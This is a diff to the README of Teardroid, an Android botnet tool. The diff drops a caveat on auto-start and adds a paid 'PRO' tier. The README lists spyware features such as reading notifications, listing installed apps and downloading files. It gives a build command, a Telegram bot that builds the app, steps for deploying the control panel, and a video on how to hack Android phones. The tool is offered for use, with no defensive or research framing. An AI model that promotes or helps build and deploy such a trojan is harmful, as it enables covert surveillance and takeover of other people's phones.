@@ -17,7 +17,7 @@ It's easy to use android botnet work without port forwarding, vps and android st
 - Get Installed Apps
 - Download File
 - Read Notification
-- Auto-Start (May not work on a couple of devices)
+- Auto-Start
 
 ### Requirement
 
@@ -74,7 +74,7 @@ $ python Teardroid.py -b your_app_name
 [![Deploy](https://button.deta.dev/1/svg)](https://go.deta.dev/deploy?repo=https://github.com/ScRiPt1337/Teardroidv4_api)
 
 ### Build using bot
-- Build Teardroid using teardroid_bot https://t.me/teardroid_bot in telegram
+- Build Teardroid using [teardroid_bot](https://t.me/teardroid_bot) in telegram
 ### Manually deploy the Teardroid control panel
 - Set up an account at [deta.sh](https://web.deta.sh/)
 - Install [Deta Cli](https://docs.deta.sh/docs/cli/install)
@@ -100,6 +100,9 @@ $ deta deploy
 
 ### Demo Video
 - Video : [how to hack android phone using Teardroid v4](https://www.instagram.com/tv/CZSu4y0osHo/?utm_source=ig_web_button_share_sheet)
+
+### Teardroid PRO
+- Go to [teardroid_bot](https://t.me/teardroid_bot) and type /pro to know about teardroid pro
 
 ### Support me
 [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/script1337x)
